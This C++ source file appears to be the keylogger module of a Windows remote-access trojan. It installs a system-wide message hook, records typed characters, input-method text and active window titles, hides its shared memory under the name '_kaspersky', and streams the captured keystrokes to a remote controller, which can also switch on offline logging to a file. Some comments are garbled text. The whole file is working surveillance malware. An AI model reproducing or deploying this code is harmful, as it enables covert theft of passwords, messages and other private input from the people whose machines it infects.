// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "..\pch.h"
#include "KeyboardManager.h"
#pragma comment(lib, "Imm32.lib")

bool g_bSignalHook = false;

TShared* CKeyM::m_pTShared = NULL;
HANDLE		CKeyM::m_hMapping_File = NULL;
HINSTANCE	CKeyM::g_hInstance = NULL;
DWORD		CKeyM::m_dwLastMsgTime = GetTickCount();
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKeyM::CKeyM(privatra*pClient) : Cprotm(pClient)
{
	g_bSignalHook = true;

	sendStartKeyBoard();
	WaitForDialogOpen();
	
	int	dwOffset = m_pTShared->dwOffset;

	while (m_pClient->IsRunning())
	{
		if (m_pTShared->dwOffset != dwOffset)
		{
			UINT	nSize;
			if (m_pTShared->dwOffset < dwOffset)
				nSize = m_pTShared->dwOffset;
			else
				nSize = m_pTShared->dwOffset - dwOffset;
			
			sendKeyBoardData((unsigned char *)&(m_pTShared->chKeyBoard[dwOffset]), nSize);
			
			dwOffset = m_pTShared->dwOffset;
		}
		Sleep(300);
	}

	if (!m_pTShared->bIsOffline)
		g_bSignalHook = false;
}

CKeyM::~CKeyM()
{

}



void CKeyM::SaveInfo(char *lpBuffer)
{
	if (lpBuffer == NULL)
		return;

	DWORD	dwBytes = strlen(lpBuffer);

	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;

	HWND hWnd = GetActiveWindow();

	if(hWnd != m_pTShared->hActWnd)
	{
		m_pTShared->hActWnd = hWnd;
		char strCapText[256];
		GetWindowText(m_pTShared->hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		GetLocalTime(&SysTime);
		memset(strSaveString, 0, sizeof(strSaveString));
		wsprintf
			(
			strSaveString,
			"\r\n[%02d/%02d %02d:%02d] (%s)\r\n",
			SysTime.wMonth, SysTime.wDay,
			SysTime.wHour, SysTime.wMinute,
			strCapText
			);
		// �ú���Ϊ��Ӧ�ñ����
		SaveInfo(strSaveString);	
	}


	// reset
	if ((m_pTShared->dwOffset + dwBytes) > sizeof(m_pTShared->chKeyBoard))
	{
		memset(m_pTShared->chKeyBoard, 0, sizeof(m_pTShared->chKeyBoard));
		m_pTShared->dwOffset = 0;
	}
	lstrcat(m_pTShared->chKeyBoard, lpBuffer);
	m_pTShared->dwOffset += dwBytes;
}

LRESULT CALLBACK CKeyM::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	MSG*	pMsg;
	char	strChar[2];
	char	KeyName[20];
	LRESULT result = CallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);

	pMsg = (MSG*)(lParam);
	// ��ֹ��Ϣ�ظ�������¼�ظ�����pMsg->time�ж�
	if (
		(nCode != HC_ACTION) || 
		((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(m_dwLastMsgTime == pMsg->time)
		)
	{
		return result;
	}

	m_dwLastMsgTime = pMsg->time;
	
	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		HIMC	hImc = ImmGetContext(hWnd);
		LONG	strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		// ���ǵ�UNICODE
		strLen += sizeof(WCHAR);
		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
		strLen = ImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
		ImmReleaseContext(hWnd, hImc);
		SaveInfo(m_pTShared->str);
	}

	if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveInfo(strChar);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveInfo("\r\n");
		}
		// �����ַ�
		else
		{
			memset(KeyName, 0, sizeof(KeyName));
			if (GetKeyNameText(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				lstrcat(KeyName, "]");
				SaveInfo(KeyName);
			}
		}
	}
	return result;
}


void CKeyM::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
		NotifyDialogIsOpen();

	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		m_pTShared->bIsOffline = !m_pTShared->bIsOffline;
		if (!m_pTShared->bIsOffline)
			DeleteFile(m_pTShared->strRecordFile);
		else if (GetFileAttributes(m_pTShared->strRecordFile) == -1)
		{
			HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			CloseHandle(hFile);
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && m_pTShared->bIsOffline)
	{
		HANDLE hFile = CreateFile(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(hFile);
	}
}

bool CKeyM::Initialization()
{
	CSRSD ShareRestrictedSD;
	m_hMapping_File = CreateFileMapping((HANDLE)0xFFFFFFFF, ShareRestrictedSD.GetSA(), PAGE_READWRITE, 0, sizeof(TShared), "_kaspersky");
	if (m_hMapping_File == NULL)
		return false;

	// ע��m_pTShared���ܽ��������������Ϊ�����Ѿ�����, Ҫ��StartHook����в���
	m_pTShared = (TShared *)MapViewOfFile(m_hMapping_File, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);

	if (m_pTShared == NULL)
		return false;

	return true;
}

bool CKeyM::StartHook()
{
	if (!Initialization())
		return false;

	ZeroMemory(m_pTShared, sizeof(TShared));

	g_bSignalHook = true;

	m_dwLastMsgTime = GetTickCount();
	m_pTShared->hActWnd = NULL;
	m_pTShared->hGetMsgHook = NULL;
	m_pTShared->dwOffset = 0;
	
	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));

	m_pTShared->bIsOffline = false;

	if (m_pTShared->hGetMsgHook == NULL)
	{
		m_pTShared->hGetMsgHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
	}
	
	return true;
}

void CKeyM::StopHook()
{
	if (m_pTShared->hGetMsgHook != NULL)
		UnhookWindowsHookEx(m_pTShared->hGetMsgHook);
	m_pTShared->hGetMsgHook = NULL;

	UnmapViewOfFile(m_pTShared);
	CloseHandle(m_hMapping_File);
	m_pTShared = NULL;
}

int CKeyM::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)m_pTShared->bIsOffline;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyM::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;	
}